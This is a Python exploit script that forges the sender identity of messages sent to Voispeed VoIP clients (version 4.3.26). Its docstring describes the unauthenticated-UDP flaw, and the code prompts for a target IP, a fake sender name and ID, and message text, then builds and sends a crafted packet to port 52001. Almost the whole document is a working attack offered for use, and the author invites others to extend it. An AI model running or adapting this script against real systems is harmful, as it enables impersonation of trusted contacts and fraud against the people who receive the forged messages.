"""
Voispeed Message Identity Spoofer
Author: Stefano Gabryel
Website: http://www.stefano-workshop.com
Released under: GPL v3

This script is used to exploit a vulnerability in the Voispeed client version 4.3.26(Raskuophone).
Basically, you can just send a well crafted UDP packet to a client connected to a Voispeed server,
then you will be able to impersonate whoever you want.
There is neither a check to verify that the packet comes from the server, nor to verify that the
message's recipient exists.
Also you can hide the real recipient number and show a fake one, so you can receive a response
from the victim on a number showing a fake one.
I've already tested it on Voispeed client and Voice client both 4.3.26(Raskuophone), but other versions
may be affected too.

If someone is interested to improve this script to make it work with other Voispeed versions,
contact me using my website's contact form.

"""

from socket import *
import sys

s = socket(AF_INET,SOCK_DGRAM)
host = '192.168.2.100'
port = 52001
buf =1024

host = raw_input("Target IP: ")


addr = (host,port)


##senderText COMPOSITION #############################################
inputSenderText = raw_input("Sender text: ")
displaySenderId = ""
while (displaySenderId != "y" and displaySenderId != "n"):
    displaySenderId = raw_input("Do you want to display the sender id? (Y/N)").lower()

inputSenderText = inputSenderText[0:30]

senderText = inputSenderText.encode('hex')
  
if displaySenderId == "y":
    senderText += "20"
else:
    senderText += "00"
    
senderTextHead = hex(len(senderText)/2)[2:]
if len (senderTextHead) == 1:
    senderTextHead = "0" + senderTextHead

while (len(senderText)/2)<31:
    senderText +="00"

senderText = senderTextHead + senderText  
##senderText COMPOSITION #############################################      
  
 
##sender_id COMPOSITION #############################################
inputSenderID = raw_input("Sender ID: ")
senderID = inputSenderID[0:7].encode('hex')
    
senderIDHead = hex(len(senderID)/2)[2:]
if len (senderIDHead) == 1:
    senderIDHead = "0" + senderIDHead
    
while (len(senderID)/2)<7:
    senderID +="00"
    
senderID = senderIDHead + senderID
##sender_id COMPOSITION #############################################


##message COMPOSITION ################################################
inputMessage = raw_input("Message: ")
message = inputMessage[0:160].encode('hex')

messageHead = hex(len(message)/2)[2:]
if len (messageHead) == 1:
    messageHead = "0" + messageHead
    
while (len(message)/2)<160:
    message +="00"

message = messageHead + message 
##message COMPOSITION ################################################


packet = '9f201896030000c0a802020000000000000000000000000000000000000000000000'+senderText+'000000000000000000'+ senderID +'00000000000000000000000000033338390000000000000000000000000000000000'+message+'00'
packet = packet.decode('hex')  



s.sendto(packet, addr)
s.close()
print "Message sent"